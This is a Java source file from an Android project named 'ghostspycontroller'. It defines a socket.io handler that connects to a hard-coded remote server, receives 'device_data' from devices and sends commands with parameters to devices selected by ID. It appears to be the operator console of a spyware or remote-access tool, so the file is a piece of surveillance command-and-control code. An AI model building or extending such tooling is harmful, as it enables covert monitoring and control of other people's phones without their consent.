package com.ghostspycontroller;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class SocketHandler {
    private static Socket socket;
    // URL PERMANEN CLOUDFLARE
    private static final String SERVER_URL = "https://ghostspy.bruang.biz.id";
    private static MainActivity activity;

    public static void init(MainActivity act) {
        activity = act;
        try {
            socket = IO.socket(SERVER_URL);
        } catch (URISyntaxException e) {}
    }

    public static void connect() {
        if (socket == null) return;
        socket.on(Socket.EVENT_CONNECT, args -> activity.runOnUiThread(() -> activity.updateConnectionStatus(true)));
        socket.on("device_data", args -> activity.runOnUiThread(() -> activity.handleIncomingData((JSONObject) args[0])));
        socket.on(Socket.EVENT_DISCONNECT, args -> activity.runOnUiThread(() -> activity.updateConnectionStatus(false)));
        socket.connect();
    }

    public static void sendCommand(String deviceId, String command, JSONObject params) {
        if (socket == null || !socket.connected()) return;
        try {
            JSONObject msg = new JSONObject();
            msg.put("device_id", deviceId);
            msg.put("command", command);
            msg.put("params", params);
            socket.emit("command", msg);
        } catch (Exception e) {}
    }

    public static boolean isConnected() { return socket != null && socket.connected(); }
}
